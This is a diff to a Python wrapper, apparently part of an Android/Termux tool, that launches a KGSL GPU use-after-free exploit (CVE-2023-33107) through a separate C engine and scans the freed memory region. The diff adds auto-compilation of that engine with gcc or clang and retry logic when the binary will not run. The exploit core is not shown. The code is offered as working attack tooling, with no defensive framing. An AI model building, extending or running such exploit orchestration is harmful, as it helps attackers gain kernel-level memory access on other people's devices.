@@ -173,14 +173,45 @@ class MemoryExplorerAI:
         except:
             return 0.0
 
+    def try_compile_engine(self):
+        source_path = self.engine_path + ".c"
+        if not os.path.exists(source_path):
+            print(f"[-] AI Error: Source code {source_path} not found.")
+            return False
+            
+        print(f"[*] AI: Detected architecture mismatch or missing binary. Attempting auto-compilation...")
+        # Try gcc first, then clang (common in Termux)
+        for compiler in ["gcc", "clang"]:
+            try:
+                print(f"[*] AI: Trying to build with {compiler}...")
+                subprocess.check_call([compiler, "-O2", source_path, "-o", self.engine_path, "-lpthread"])
+                print(f"[+] AI: Engine successfully compiled for {platform.machine()}.")
+                return True
+            except (subprocess.CalledProcessError, FileNotFoundError):
+                continue
+        
+        print("[-] AI: Auto-compilation failed. Please install a compiler (apt install build-essential).")
+        return False
+
     def trigger_exploit(self):
         if self.exploit_proc:
             print("[!] Exploit already active.")
             return
+        
         print("[*] Triggering KGSL UAF (CVE-2023-33107)...")
-        # In a real scenario, this would start the background UAF process
-        # For now, we simulate the start of the engine in exploit mode
-        self.exploit_proc = subprocess.Popen([self.engine_path, "exploit"], stdout=subprocess.PIPE, text=True)
+        try:
+            self.exploit_proc = subprocess.Popen([self.engine_path, "exploit"], stdout=subprocess.PIPE, text=True)
+        except OSError as e:
+            if e.errno == 8: # Exec format error
+                if self.try_compile_engine():
+                    # Retry after compilation
+                    self.exploit_proc = subprocess.Popen([self.engine_path, "exploit"], stdout=subprocess.PIPE, text=True)
+                else:
+                    return
+            else:
+                print(f"[-] AI Hardware Error: {e}")
+                return
+
         # Note: We need to add 'exploit' command to kgsl_engine.c to keep it alive
         time.sleep(2)
         print("[+] UAF Window opened. GPU access ready.")
@@ -263,7 +294,16 @@ class MemoryExplorerAI:
                     continue
                 print("[*] Starting AI Memory Scan (Slow Mode)...")
                 scan_cmd = [self.engine_path, "scan", hex(self.uaf_start), hex(self.uaf_start + 0x1000000)]
-                proc = subprocess.Popen(scan_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+                try:
+                    proc = subprocess.Popen(scan_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+                except OSError as e:
+                    if e.errno == 8: # Exec format error
+                        if self.try_compile_engine():
+                            proc = subprocess.Popen(scan_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+                        else: continue
+                    else:
+                        print(f"[-] AI Scanner Error: {e}")
+                        continue
                 
                 try:
                     for line in proc.stdout:
